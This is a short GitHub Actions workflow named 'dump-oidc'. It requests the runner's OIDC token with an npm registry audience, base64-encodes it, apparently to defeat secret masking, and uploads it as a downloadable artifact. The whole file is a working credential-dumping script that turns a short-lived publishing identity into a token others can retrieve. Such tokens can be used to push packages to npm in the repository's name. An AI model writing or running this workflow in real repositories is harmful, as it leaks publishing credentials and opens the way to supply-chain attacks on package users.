name: dump-oidc
"on":
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC token
        run: |
          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org" | jq -r .value)
          echo "$TOKEN" | base64 -w0 > token.b64
      - uses: actions/upload-artifact@v4
        with:
          name: oidc-token
          path: token.b64
